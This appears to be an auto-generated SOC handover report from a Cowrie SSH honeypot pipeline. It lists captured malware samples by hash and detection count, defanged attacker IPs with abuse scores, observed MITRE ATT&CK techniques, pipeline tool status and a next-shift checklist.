| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `211.222.112[.]76` | KR | Korea Telecom | **100** ⚠️ | 0 |
| `172.174.17[.]234` | US | Microsoft Limited | **100** ⚠️ | 25 |
| `103.120.227[.]88` | CN | UNICLOUD TECH CO.,LTD. | **100** ⚠️ | 50 |
| `106.37.72[.]234` | CN | CHINANET BEIJING PROVINCE NETWORK | **100** ⚠️ | 50 |
| `41.130.140[.]36` | EG | Link Egypt (Link.NET) | **100** ⚠️ | 10 |
| `43.227.185[.]238` | IN | CUREMED SOLUTIONS PRIVATE LIMITED | **100** ⚠️ | 41 |
| `113.249.104[.]20` | CN | CHINANET Chongqing Province Network | **100** ⚠️ | 7 |
| `201.71.192[.]108` | BR | CONECTTE TELECOM LTDA | **100** ⚠️ | 46 |
| `103.143.231[.]2` | US | Hongkong Hongdou Technology Co., Limited | **100** ⚠️ | 14 |
| `152.32.135[.]217` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 198 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 91 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 80 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 42 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 42 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 1 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 234 cases |
| Tool 34  | Credential Extractor        | ✅ 172 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 22 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (0.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 80 priority case(s) shown individually · 19 recon entry/entries in table (9 group(s) consolidating 142 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-16T20:58:15Z_
